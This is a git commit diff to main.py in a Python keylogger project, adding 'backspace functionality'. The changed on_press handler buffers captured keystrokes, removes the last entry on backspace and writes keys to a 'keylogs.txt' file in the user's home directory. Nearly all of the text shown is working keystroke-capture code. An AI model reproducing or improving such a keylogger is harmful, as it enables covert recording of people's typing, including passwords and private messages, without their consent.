a4b5e860b330cb885392caad0b2d46ddd5c23e58
Linux4dev <42683597+Linux4dev@users.noreply.github.com>
2021-03-22 15:28:03 -0300

    Added backspace functionality

--- main.py
+++ main.py
@@ -3,11 +3,19 @@ from pathlib import Path
 import logging
 
 log_dir = str(Path.home()) + "\\"
-logging.basicConfig(filename=(log_dir + "keylogs.txt"),
-    level=logging.DEBUG, format='%(asctime)s: %(message)s')
+logging.basicConfig(filename=(log_dir + "keylogs.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
+
+wordList = ['']
 
 def on_press(key):
-    logging.info(str(key))
+    if key != keyboard.Key.backspace:
+        wordList.append(str(key))
+    
+    if key == keyboard.Key.backspace and len(wordList) >= 1:
+        wordList.pop()
+    
+    if len(wordList) == 20:
+        logging.info(wordList.pop(0))
 
 def on_release(key):
     if key == keyboard.Key.esc:
